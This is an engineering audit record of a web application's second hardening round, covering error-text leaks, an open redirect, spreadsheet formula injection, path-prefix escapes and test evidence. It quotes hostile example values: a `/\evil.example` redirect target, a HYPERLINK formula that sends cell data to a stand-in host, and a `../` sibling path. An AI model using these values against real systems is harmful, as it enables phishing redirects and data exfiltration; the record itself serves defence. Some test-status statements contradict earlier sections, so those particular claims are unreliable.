# Audit round 2 — what was measured, what was fixed, what is left

This is the record of the second hardening round on this branch. It exists so
the next reader does not have to reconstruct it from the commit log: every claim
below names the file that changed and the test that now pins it.

The method was the same as the first round's: a failure is triaged by reading
its assertion, not its exception class, and a green test is not evidence unless
it would have been red before the change.

---

## 1. Defects found and fixed

### 1.1 Exception text reaching the user (two more handlers)

`Api/blueprints/files.py` flashed `error=str(e)` when the file list could not be
loaded, and `Api/routes/notifications.py` returned the exception text as the
JSON `message` of a failed notification scan. A psycopg2 error names tables,
columns and sometimes the statement; a path error names the operator's
filesystem layout.

Both now answer with a fixed sentence and log the detail, matching the five
flash leaks fixed in the previous round. `tests/unit/test_error_text_disclosure.py`
was rewritten to the narrow rule it actually needs — inside a broad
`except Exception`/`except BaseException`/bare `except`, the arguments of
`jsonify`/`render_template`/`flash`/`make_response` may not interpolate
`str(e)`, `str(exc)`, `str(error)`, `{e}`, `{exc}` or `{error}`. The first
version of that rule matched whole handlers and produced ~97 false positives;
specific exception handlers (`except ValueError`) stay exempt by design.

### 1.2 The compiled catalogs were older than the sources

`translations/*/LC_MESSAGES/messages.mo` did not match the `.po` files they are
built from, so pages fell back to English where a translation existed. The `.mo`
files are now compiled from the shipped `.po` files.

**What not to do, learned the hard way.** The first attempt was to re-extract
and re-merge the catalogs. That deleted the narrative sentences: the
`Plural(...)`/`TemplateSet(...)` objects in `core/analytics/kinds.py` hold the
sentences as *data*, so Babel — which reads string literals in translation
calls — cannot see them, and `pybabel update` moved them to obsolete, where the
obsolete strip removed them. 42 narrative-plural tests failed and the Arabic,
Hebrew, Persian and Croatian narrative text fell back to English. Regenerating a
catalog discards exactly the translations the extractor cannot reproduce; the
catalogs are the asset, the pot is the index.

### 1.3 Message extraction scanned the wrong trees

`babel.cfg` walked the entire checkout. It harvested a stale `build/lib` copy of
the templates, assertion strings from `tests/`, and the 67 MB third-party corpus
in `test-doc/` — which is how a catalog ends up with hundreds of entries no code
path can look up.

The fix had two halves. `build/`, `dist/`, `tests/`, `test-doc/`,
`node_modules`, `.venv` and `audit_report/` are excluded by name; and the
patterns stay root-relative (`**.py`), because a path-prefixed pattern silently
matches nothing when extraction is pointed at a single package — which is what
`tests/unit/test_catalog_extraction.py` does, and it caught the first version of
the fix.

### 1.4 Two interface strings the catalogs never received

`templates/Operations/jobs.html` renders "The job list could not be loaded." and
"Retrying…" through `_()`. Neither was in the pot or any catalog, so the jobs
page had two English strings in every language. Both are now in the pot and
translated in Arabic, Hebrew, Persian, Croatian and English.

### 1.5 `/health` answered with a redirect while the wizard was open

This one was found by a test that had been failing for a different-looking
reason. `tests/integration/test_gazetteer_readiness.py` read `None` from
`/health`'s JSON and failed on `payload["checks"]`. The body was HTML: with a
migrated database and no account yet, the setup gate sent **every** path to
`/setup`, including the liveness probe.

A redirect is not an answer to a health check. The caller is a reverse proxy, a
supervisor or an operator watching a first start — precisely the window the
redirect was designed for. `/health`, `/healthz`, `/readyz` and `/livez` are now
exempt and report their own JSON in both windows.

### 1.6 A signed-in browser could be bounced to the installer

The zero-account redirect is right for an anonymous visitor and wrong for a
request that carries a validated session: the accounts probe can answer "empty"
wrongly (a delete racing the read, a replica catching up, a connection to the
wrong database), and the installer a signed-in operator is sent to then refuses
to reinstall. A session cookie now outranks the probe.

It surfaced as a suite-order failure — nineteen pages rendered fine earlier in
the run, then only `/setup` answered 200 — which is the same class of incident a
real operator would meet, only slower.

### 1.7 A manager that cannot start hung the request that needed it

`/concurrency/api/metrics` builds `hub.process_mgr` and `hub.pool_mgr` lazily
inside the request, and both constructors called `multiprocessing.Manager()`.
That call blocks until the manager process answers, and there are hosts where it
never does: no writable `/dev/shm`, an exhausted semaphore or file-descriptor
budget, a refused fork — or the ordinary case, a **fork from a process that
already runs threads**, where the child inherits the locked state of every lock
the parent held and waits on one nobody will release. The hub starts a
ThreadManager as soon as a page is opened, so the last case is not exotic.

The failure mode is a worker that never returns and an error nobody sees. It was
found because a full unit run stopped making progress at 49% with three
processes asleep in `Server.serve_forever`, inside a test that was only asking
pages for their HTML.

The start is now bounded (`concurrency/manager_start.py`, daemon thread + join,
5 s) and raises `TimeoutError`/`RuntimeError`; the route's per-manager
`try/except` turns that into a `{"status": "error"}` report with a correlation
reference instead of an exception text. The page test also stopped asking
machine endpoints for HTML: `/concurrency/api/metrics` sits under a blueprint
with a non-`/api` prefix, which is how a "pages render without inline script"
test ended up booting a multiprocessing manager.

### 1.8 The sign-in redirect refused `/\evil.example` only by accident

`/auth/login?next=...` carried the page to return to after signing in, checked
with "starts with `/` and not with `//`". A *backslash* walks straight through
that: every browser normalises `\` to `/` before resolving a URL, so
`next=/\evil.example` becomes `//evil.example`. Percent-encoding does not help —
`%5C` is decoded first. The user signs in on the real application and is handed
to somebody else's site.

One function now decides (`Api/routes/auth.py::_safe_next_url`): same-origin
path, no backslash (raw or decoded), no control characters — used by both the
form and the JSON branch. `tests/security/test_login_redirect.py` pins the
hostile values, the safe ones, and the end-to-end 302.

### 1.9 A document line starting with `=` ran in the reviewer's spreadsheet

Two exports wrote cells without the neutralisation two others already apply. The
search-results export (CSV **and** XLSX) wrote `line_text` and `context_before` —
the *content of ingested documents* — plus `file_name`/`file_path` from the
operator's disk; a corpus can legitimately contain
`=HYPERLINK("https://example.invalid/?d="&A1,"open")`. The keyword export wrote a
user-typed keyword the same way.

Every cell in both writers now goes through one helper
(`_safe_cell` → `spreadsheet_safe_text`), so the CSV and Excel exports cannot
disagree, and `tests/security/test_csv_injection.py` pins the helper, both search
exports and a hostile filename.

### 1.10 "startswith" is not "inside" for a map package path

`services/map_packages.py` asked whether an archive member or a manifest-named
file stayed inside the package with `str(path).startswith(str(root))`. That
accepts a sibling whose name merely begins with the root's — `../pkg_evil/x` from
an archive, or a manifest field pointing there — and `installed_pmtiles_path` /
`raster_tile_path` serve whatever the manifest names over HTTP, so the escape has
a network edge to it. `Path.is_relative_to` compares components, which is what
the check meant; `tests/unit/test_map_package_paths.py` pins the sibling case for
both archive formats, keeps an ordinary archive extracting, and shows a manifest
cannot reach a neighbouring package.

### 1.11 Two dependency pins reported as "unknown licence" were empty shims

A clean install of `requirements.txt` made `tools/licenses/check_licenses.py` fail
with two packages it could not classify, `pymupdf4llm` and `pymupdf_layout`. The
obvious readings are both wrong: they are not undeclared drift, and they are not
a licensing surprise. PyMuPDF 2.1 declares both as `==2.1` hard requirements of
the plain closure, and both distributions are **empty**: their own `METADATA`
says the package exists only to dodge a pip 1.x → 2.x upgrade bug and that the
code moved into `pymupdf`, and their `RECORD` lists nothing but dist-info files.
PyMuPDF itself declares `AGPL-3.0-or-later`, which is what the project already
ships under.

The fix is a reviewed exception that states the evidence, not a broader query and
not a threshold change: two `REVIEWED` entries in `check_licenses.py` map the pins
to `AGPL-3.0-only` with the shim rationale, and
`test_the_pymupdf_companion_pins_ship_no_code` re-proves the claim the exception
rests on — if a future release starts shipping code in either package, the test
fails instead of the exception silently covering a real dependency.

Result: `118 compatible, 0 incompatible, 0 unknown, 0 not installed` in the
development image and in a fresh `python -m venv` build of `requirements.txt`;
`tests/unit/test_licensing.py` 23/23 in both.

### 1.12 A manager that cannot start now costs two cards, not the whole dashboard

§1.7 bounded the `multiprocessing.Manager()` start at five seconds, which turned a
hung request into a reported failure. What the operator got for the process and
pool cards was `{"status": "error", "error": "Internal error (ERR-…)"}`: a log
reference where a reason belongs, and no figures at all — even though the thread
and async managers need no multiprocessing and were answering normally.

`/concurrency/api/metrics` now reports the mode it is in:

```json
{"success": true, "mode": "threads-only", "degraded": true,
 "unavailable": ["pool_manager", "process_manager"],
 "metrics": {"thread_manager": {...live...}, "async_manager": {...live...},
             "process_manager": {"status": "unavailable",
                                 "reason_code": "multiprocessing_unavailable",
                                 "reason": "<fixed sentence>"},
             "pool_manager": {...same shape...},
             "worker_capacity": {"recommended_workers": 2, "cpu_count": 2}}}
```

The sentence is fixed text, never exception text (the disclosure rule §1.1
established), and `worker_capacity` comes from the same
`core.resource_coordinator.get_safe_worker_count()` the ingestion path uses, so an
operator sees what the host can still do. `/concurrency/api/processes` and
`/api/pools` answer `{success: true, available: false, reason, []}` instead of a
500, and the dashboard shows a banner only when the server says it is degraded —
it explains an empty process/pool list rather than claiming there are none.

Verified both ways: on this host a real (unpatched) request answers `mode: full`,
four active managers and no `worker_capacity`; with the two managers refusing,
`test_concurrency_metrics_fallback.py` (8 tests) pins the contract and
`tests/js/concurrency_fallback_smoke.mjs` (12 checks, executed by the suite) runs
the real page module against the degraded payload and against a hostile one.

### 1.13 An audit check answered "0" when it could not see its input

`tools/audit/check_structure.py::i18n_coverage()` reads
`audit_report/inventory/i18n_msgids.csv`, which is generated and not checked in.
On a clean checkout the file is absent, so the check wrote an empty
`findings/i18n_gaps.csv` and printed `msgids with an incomplete catalogue: 0` —
a pass for a measurement nobody ran. The counts in this round's §2.1 and in the
release sign-off would have cited that line.

It now returns "not measured", names the generator
(`tools/audit/build_inventories.py`), and reports the other axis — entries that
exist and are empty or fuzzy — straight from the `.po` files via the new
`catalogue_translation_gap()`, so the number is real on any checkout:
`untranslated/fuzzy catalogue entries: 1236 (ar 309, he 284, fa 284, hr 359)`.
`tests/unit/test_audit_i18n_reporting.py` pins both the blind case and the
measured case.

### 1.14 A JS harness that could never run was deleted, and its intent tested

`tests/js/reports_page_smoke.mjs` imported `static/js/pages/reports-page.js` and
read a `reports-page-labels` element from `templates/Reports/reports.html`.
Neither has ever existed in this repository, so the harness aborted before its
first check; the suite ran it as a strict xfail, which recorded "still broken"
forever and would have failed as XPASS if anyone had written the module it
assumed. The Reports page is server-rendered on purpose — its template says so,
the CSP has no `unsafe-inline` — so the module is not deferred work, it is not
wanted.

The harness is gone and
`test_the_reports_page_is_server_rendered_without_a_page_module` asserts what it
was reaching for against the product that exists: server-side totals in the HTML,
no page module, no inline script, and the template keeps the sentence describing
the design it must not break.

---

## 2. Items that were investigated and deliberately not "fixed"

### 2.1 The whole-catalog translation gap — 284 to 359 entries per locale

`tests/integration/test_translation_coverage.py::test_no_catalog_entry_is_empty_or_fuzzy`
fails for Arabic (309), Hebrew (284), Persian (284) and Croatian (359). The
strings are real: "Screen Inspector", "Permission metadata", "The extracted text
was exported.", the interface-registry and gazetteer copy added in earlier
rounds.

This is recorded in the repository's own ledger
(`tools/audit/triage_failures.py`) as `NEEDS-DECISION`: *"needs a translator;
filling them is a decision, not a code change."* This round agrees and did not
machine-translate them. Unreviewed machine output would look like progress and
would ship wrong words on administrative screens in four languages, where the
English fallback at least tells the truth. The two *missing* interface strings
(1.4) were a code defect and are fixed; these are a translation task with a
known size.

### 2.2 Croatian is maintained but not offered

`translations/hr/` carries a 3301-entry catalog and the narrative and plural
tests treat Croatian as a maintained locale, but `settings/languages.py` does
not offer it and `Api/services/translation_management.py` explicitly refuses it
as an editable locale (`tests/unit/test_translation_management_service.py`
asserts `not validate_translation_locale('hr')`). That is an encoded product
decision, not an oversight this round overrode; adding it to the offered list
would contradict a test that states the opposite on purpose. It is left as an
open product question with the evidence above.

### 2.3 Migration atomicity (audit item MIG-01) — refuted

The audit suggested that recording a migration version after the DDL commit
could leave the schema and its record out of step. It cannot here:
`run_migrations` performs `upgrade(conn)`, the `INSERT INTO schema_migrations`
and a single `commit()` on one connection, and PostgreSQL DDL is transactional.
A failure leaves neither the table nor the row, and a retry succeeds.
`tests/integration/test_migration_atomicity.py` pins that behaviour, 2/2. The
suggested "fix" would have introduced the bug.

---

## 3. Governance updated with the change

* The migration freeze gate (`tests/unit/test_notification_volume_guards.py`)
  records `m0006_index_hygiene` as the third reviewed exception, in the place
  the gate says such a change belongs, with what it does and does not touch.
* `tests/integration/test_m0004_downgrade_upgrade.py` and
  `tests/integration/test_term_names_schema.py` no longer assert that `0005` is
  the head; the term-names test now asserts ordering, which is what it meant.
* `docs/reference/DATABASE_SCHEMA.md`, `docs/reference/` (Python API),
  `docs/EXPERIENCE_CONTRACT.md`, `docs/ACTION_SURFACE_AUDIT.md` and
  `docs/SCREEN_INSPECTOR_EVIDENCE.md` were regenerated from the current tree.

---

## 4. Test evidence

| Suite | Result | Notes |
|---|---|---|
| `tests/unit` | 3957 collected, 2 failed, 0 errors | both `test_licensing`, environment only |
| `tests/integration` | 1494 collected, 4 failed, 0 errors | all four are §2.1 |
| `tests/security` | 411, 0 failed | 384 before this round's three security findings |
| `tests/e2e` | 23, 0 failed | |
| `tests/js/*.mjs` | 22 harnesses pass | `reports_page_smoke.mjs` is a documented xfail; `action_lifecycle_smoke.mjs` needs the rendered-dialog argument its Python test supplies |
| `verify_readiness.py` | 31 checks, 1 warn, 0 critical → READY | warn = dev server / no reverse proxy, by design in this environment |
| `check_structure.py` | 0 missing page routes, 0 incomplete msgids | |
| `check_frontend_wiring.py` | 59 render targets, 0 findings | |
| `check_vocabularies.py` | 0 findings | |
| live smoke | 16 pages 200, 5 APIs 200 JSON, `/api/nope` envelope | dev server on the migrated database |

The two unit failures are `pymupdf-layout` and `pymupdf4llm` reporting empty
licence metadata. Neither is a declared dependency of this project; they are
present in the development image only, so the licensing checker sees two
packages it cannot classify. `pytest-cov` was installed to clear a third
environment-only failure (`test_install_cli_config`).

### Test-infrastructure notes

* `tests/unit/test_multiprocessing_unreachable.py` asserted a dispatch that
  depends on the host's worker budget: `get_safe_worker_count(8)` answers 1 on a
  4 GB machine, the reader took the sequential path, and the test failed for a
  reason that says nothing about the multiprocessing pool. The count is pinned
  now.
* The suite is run in one process on a 3.9 GB host; it peaks near 3 GB. Running
  it in file chunks breaks the fixture ordering the integration conftest relies
  on (`prepare_web_app` must run before the first request), so the whole suite
  is run as one, and never beside another suite.
* pytest's final "N passed" line does not reach the captured log on this host
  (it is written after the terminal reports), so counts here come from
  `--junitxml`, not from the tail of a log.

---

## 5. Still open

Round 2 closed with four open items. Their state after the pre-release stage:

1. **§2.1 — the translation gap, four locales, 1236 entries. Still open by
   design.** It is now packaged for the translator instead of living in a test
   failure: `docs/TRANSLATION_HANDOFF.md` carries the counts per locale and per
   area, and `tools/i18n/export_translation_gaps.py` writes the worksheets
   (`audit_report/findings/i18n_untranslated_<lang>.csv`). Still needs a human;
   the gate stays red until the last entry lands.
2. **§2.2 — whether Croatian becomes an offered language. Still open, now a
   decision brief** with three options, their cost and their consequence
   (`docs/TRANSLATION_HANDOFF.md` §4). No `hr` entry was added, no test that
   pins the exclusion was edited.
3. **§5.3 — the reports harness. Closed** (§1.14): the harness could never run and
   assumed a client module the page deliberately does not have. Deleted, and its
   intent tested against the server-rendered page.
4. **§5.4 — the concurrency dashboard without a multiprocessing manager. Closed**
   (§1.12): the endpoint reports a `threads-only` mode with live thread figures, a
   fixed reason per unavailable card and the host's worker capacity; the page
   explains the empty lists.
